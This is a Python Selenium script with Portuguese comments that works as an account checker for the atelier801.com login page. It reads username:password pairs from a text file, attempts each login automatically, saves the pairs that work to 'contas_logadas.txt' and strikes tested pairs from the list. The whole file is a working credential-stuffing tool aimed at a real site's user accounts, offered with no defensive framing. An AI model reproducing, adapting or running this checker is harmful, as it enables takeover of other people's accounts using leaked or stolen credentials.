import multiprocessing as mp
import selenium
from selenium import webdriver
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
import numpy as np
import time

# Configuração do Selenium
options = webdriver.ChromeOptions()
options.add_experimental_option("excludeSwitches", ["enable-logging"])
service = webdriver.chrome.service.Service(executable_path='chromedriver.exe')

# Função para salvar contas com login bem-sucedido
def save_account(username, password):
    with open('contas_logadas.txt', 'a') as f:
        f.write(f'{username}:{password}\n')

# Função para verificar e fazer login nas contas
def Checker(driver, username, password):
    try:
        # Carregar o site
        driver.get("https://atelier801.com/login?redirect=https%3A%2F%2Fatelier801.com%2Findex")

        # Insere o nome de usuário e senha
        WebDriverWait(driver, 6).until(EC.presence_of_element_located((By.XPATH, '//*[@id="auth_login_1"]')))
        driver.find_element(By.XPATH, '//*[@id="auth_login_1"]').send_keys(username)
        WebDriverWait(driver, 6).until(EC.presence_of_element_located((By.XPATH, '//*[@id="auth_pass_1"]')))
        driver.find_element(By.XPATH, '//*[@id="auth_pass_1"]').send_keys(password)

        # Clica para manter conectado e fazer login
        WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.XPATH, '//*[@id="corps"]/div[3]/div/form[1]/fieldset/div[4]/button')))
        driver.find_element(By.XPATH, '//*[@id="corps"]/div[3]/div/form[1]/fieldset/div[4]/button').click()

        # Verificar se o login foi bem-sucedido
        try:
            disconnect_button = WebDriverWait(driver, 6).until(EC.presence_of_element_located((By.XPATH, '//*[@id="formulaire_deconnexion"]/button')))
            print(f"Login bem-sucedido para {username}:{password}")
            save_account(username, password)

            # Desconectar a conta
            try:
                disconnect_button.click()
                print("Conta desconectada com sucesso.")
                time.sleep(2)
                return True
            except:
                print("Não foi possível desconectar a conta.")
                return False
        except TimeoutException:
            print(f"Senha incorreta chefe :( {username}:{password}")
            with open('contas_testadas.txt', 'a') as f:
                f.write(f'{username}:{password}\n')

            # Remove a conta testada da lista de contas
            with open('lista_de_contas.txt', 'r+') as f:
                lines = f.readlines()
                f.seek(0)
                for line in lines:
                    if not line.startswith(f'{username}:{password}'):
                        f.write(line)
                f.truncate()
            return
    except TimeoutException:
        print(f"Erro: tempo esgotado {username}:{password}")
        return
    except Exception:
        print(f"Erro: {username}:{password} exception")

# Função que cada processo executará
def process_func(accounts):
    # Inicializa o driver do Chrome
    driver = webdriver.Chrome(service=service, options=options)
    driver.set_window_size(1200, 800)

    # Cria uma cópia da lista de contas para evitar conflitos durante a iteração
    accounts_copy = accounts.tolist().copy()

    # Itera sobre a lista de contas
    for account in accounts:
        # Realiza a verificação de login para cada conta
        Checker(driver, account[0], account[1])
        # Remove a conta da cópia da lista
        accounts_copy.remove(account.tolist())
        # Atualiza a lista de contas no arquivo após cada verificação
        with open('lista_de_contas.txt', 'w') as f:
            f.write('\n'.join([f'{acc[0]}:{acc[1]}' for acc in accounts_copy]))
    # Fecha o driver quando todas as contas foram verificadas
    driver.quit()

# Função principal
if __name__ == '__main__':
    # Carrega a lista de contas do arquivo
    accounts = []
    with open('lista_de_contas.txt', 'r') as f:
        for line in f.readlines():
            accounts.append(line.strip().split(':'))

    # Divide a lista de contas em partes iguais para cada processo
    splitted_accounts = np.array_split(accounts, 1)

    # Cria e inicia os processos
    processes = []
    for i in range(1):
        p = mp.Process(target=process_func, args=(splitted_accounts[i],))
        processes.append(p)
        p.start()

    # Espera todos os processos terminarem
    for p in processes:
        p.join()
